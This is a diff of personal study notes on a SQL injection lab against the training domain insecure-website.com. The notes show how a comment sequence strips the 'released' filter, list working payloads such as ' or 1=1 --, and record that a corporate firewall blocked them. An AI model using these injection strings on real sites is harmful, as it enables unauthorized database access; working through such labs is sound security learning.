@@ -11,3 +11,10 @@ https://insecure-website.com/products?category=Gifts Real web page
 https://insecure-website.com/products?category=Gifts'--   Injection, Single quote gives Gifts inned 'Gifts' as app tacks on '' outer. 
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1;   Real query
 SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;  What our '-- did
+You need to get all categories released and unlreleased:
+' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
+filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
+Above code worked but only because corporate firewall was blocking the real solution: ' or 1=1 --
+
+You can do this one from the GUI but it says to use intercept and modify from BURP. I thought BURP requirement was why I was failing. It doesn't care about client side
+it was a firewall. 
